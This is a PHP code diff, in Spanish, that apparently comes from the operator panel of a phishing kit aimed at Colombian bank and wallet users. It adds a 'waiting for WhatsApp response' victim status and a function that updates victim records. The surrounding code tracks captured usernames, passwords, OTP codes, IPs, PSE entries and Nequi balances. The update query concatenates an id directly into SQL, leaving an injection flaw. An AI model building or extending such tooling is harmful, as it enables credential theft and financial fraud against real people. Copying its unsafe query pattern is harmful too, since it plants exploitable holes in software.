@@ -83,6 +83,8 @@ function put_items($id,$usr,$pass,$otp,$dis,$ip,$eml,$cml,$ban,$status,$time,$mo
 				break;
 		case 13: input_info("Ingresó Documento y Linea");	
 				break;
+		case 14: wait_info("Esperando respuesta WhatsApp"); // <-- NUEVO ESTADO AÑADIDO
+				break;
 		case 15: input_info("Ingresó PSE");	
 				break;
 		case 27: wait_info("Esperando saldo Nequi");
@@ -1074,6 +1076,15 @@ function put_pse($id,$mail){
 	}
 }
 
+// NUEVA FUNCIÓN PARA ACTUALIZAR EL ESTADO DE WHATSAPP
+function put_wpp($id){
+	date_default_timezone_set('America/Bogota');
+	$hoy = date("Y-m-d H:i:s"); 
+	if ($con = conectar()) {
+		sentencia($con,"UPDATE m3it3m SET status = '14', horamodificado='".$hoy."'  WHERE idreg = ".$id);
+		desconectar($con);
+	}
+}
 
 function put_psw($id,$mail){
 	date_default_timezone_set('America/Bogota');
@@ -1105,6 +1116,3 @@ function put_saldo_nequi($id, $saldo_txt){
 		desconectar($con);
 	}
 }
-
-
-?>
